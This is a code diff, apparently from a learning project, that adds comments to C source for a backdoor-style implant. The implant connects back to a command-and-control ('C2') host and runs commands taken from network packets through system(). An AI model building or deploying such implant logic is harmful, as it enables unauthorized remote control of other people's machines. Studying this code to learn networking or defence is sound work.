@@ -16,8 +16,10 @@ more about C networking and packets on raw sockets and whatnot
 #include <sys/socket.h>
 #include "packet.h" // Custom packet values defined
 
+// Send a ping
 int send_ping(int destination_address) {
 
+    // Set up socket
     struct sockaddr_in addr;
     int socket_fd = socket(AF_INET, SOCK_STREAM, 0);
 
@@ -26,19 +28,21 @@ int send_ping(int destination_address) {
 
     addr.sin_addr.s_addr = destination_address; 
 
+    // Connect to the C2
     if (connect(socket_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
         perror("Could not connect to C2");
         return 1;
     }
 
+    // Send pong message
     char *msg = "pong";
     send(socket_fd, msg, strlen(msg), 0);
 
     close(socket_fd);
     return 0;
-
 }
 
+// Just uses system to execute a command
 void execute_command(char* payload) {
 
     // Use system. Could use execve but system would allow for more shell like command execution
@@ -78,7 +82,6 @@ int parse_payload(char* payload, int payload_len, int source_address) {
     memcpy(command, match + 3*sizeof(uint32_t), incoming.cmd_len);
     command[incoming.cmd_len] = '\0'; // Null terminate
 
-    
     // Handle command types
     switch (incoming.command) {
 
